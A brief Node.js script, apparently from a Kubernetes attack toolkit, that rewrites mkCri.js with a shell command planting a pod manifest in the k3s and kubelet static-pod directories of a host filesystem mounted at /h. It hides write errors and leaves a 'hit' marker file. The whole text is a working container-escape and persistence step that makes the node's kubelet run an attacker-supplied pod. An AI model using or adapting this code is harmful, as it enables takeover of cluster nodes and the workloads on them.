const fs=require('fs');
let s=fs.readFileSync('mkCri.js','utf8');
const expr="const CMD=\"Y=\"+JSON.stringify(JSON.stringify(pod))+\"; for d in /h/var/lib/rancher/k3s/server/manifests /h/etc/kubernetes/manifests /h/var/lib/rancher/k3s/agent/pod-manifests; do echo $Y > $d/zzs3.json 2>/dev/null; done; echo hit >> /h/tmp/zzm3.txt\";";
s=s.replace(/const CMD.*\n/, expr+'\n');
fs.writeFileSync('mkCri.js',s);
